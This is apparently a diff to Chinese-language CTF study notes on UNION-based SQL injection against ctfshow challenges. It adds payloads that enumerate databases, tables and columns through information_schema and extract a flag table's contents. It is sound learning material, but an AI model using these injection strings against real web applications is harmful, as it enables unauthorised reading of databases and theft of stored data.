@@ -24,10 +24,14 @@
 <br>
 
 ### 第三步: 查询库 表 列
-* 查找库名:?id=-2'union select 1,2,database()--+ (三号位就是苦库的名）
-* 查找表名:id=-2'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+(这段话用于在总表information_schema中查找database()的库所对应的table_name，也就是显示这个库中所有的表名。而group_concat则可以把这些表拼接起来)
-* 查找列名:id=-2'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() --+(原理几乎同上)
 
+* 查找当前库名:?id=-2'union select 1,2,database()--+ (三号位就是苦库的名）
+* 查找当前库下所有的表名:id=-2'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+(这段话用于在总表information_schema中查找database()的库所对应的table_name，也就是显示这个库中所有的表名。而group_concat则可以把这些表拼接起来) 
+* 查找所有表（可能会有一堆乱七八糟的东西）：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables--+
+* 查看名为flag的表所在的库名：?id=-1' union select 1,2,table_schema from information_schema.columns where table_name="flag"--+
+* 查找当前库列名:id=-2'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() --+(原理几乎同上)（另外写法：?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns ctfshow --+
+）
+* 查找名为ctfshow的库下的flag表的列：?id=-1' union select 1,id,flag from ctfshow.flag--+
 ### 第四步：查询数据库
 * -2'union select * from ctfshow_web.ctfshow_user where username = 'flag' --+ （在名为ctfshow_web的库里找到名为ctfshow_user的表，并且从中寻找列名username的值为flag的数据）
 
